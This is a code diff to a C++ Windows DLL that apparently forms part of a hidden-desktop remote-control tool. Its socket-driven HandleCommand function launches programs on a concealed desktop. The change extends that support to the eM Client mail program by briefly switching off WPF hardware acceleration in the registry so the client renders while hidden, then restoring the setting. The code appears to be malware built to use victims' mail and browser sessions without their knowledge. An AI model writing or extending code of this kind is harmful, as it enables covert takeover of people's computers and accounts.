@@ -2469,6 +2469,22 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetThreadDesktop(g_hHiddenDesktop);
                     }
 
+                    // Disable hardware acceleration for WPF (eM Client) on the hidden desktop
+                    DWORD originalWpfHwAccel = 0;
+                    bool hasOriginalWpfHwAccel = false;
+                    HKEY hKeyWpf = NULL;
+                    if (wRequestedPath == L"eM Client") {
+                        if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKeyWpf, NULL) == ERROR_SUCCESS) {
+                            DWORD dwType = 0;
+                            DWORD dwSize = sizeof(DWORD);
+                            if (RegQueryValueExW(hKeyWpf, L"DisableHWAcceleration", NULL, &dwType, (LPBYTE)&originalWpfHwAccel, &dwSize) == ERROR_SUCCESS) {
+                                hasOriginalWpfHwAccel = true;
+                            }
+                            DWORD disableVal = 1;
+                            RegSetValueExW(hKeyWpf, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&disableVal, sizeof(DWORD));
+                        }
+                    }
+
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
@@ -2487,6 +2503,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
+                    }
+
+                    if (hKeyWpf) {
+                        if (hasOriginalWpfHwAccel) {
+                            RegSetValueExW(hKeyWpf, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&originalWpfHwAccel, sizeof(DWORD));
+                        } else {
+                            RegDeleteValueW(hKeyWpf, L"DisableHWAcceleration");
+                        }
+                        RegCloseKey(hKeyWpf);
                     }
 
                     if (hCurrentDesktop) {
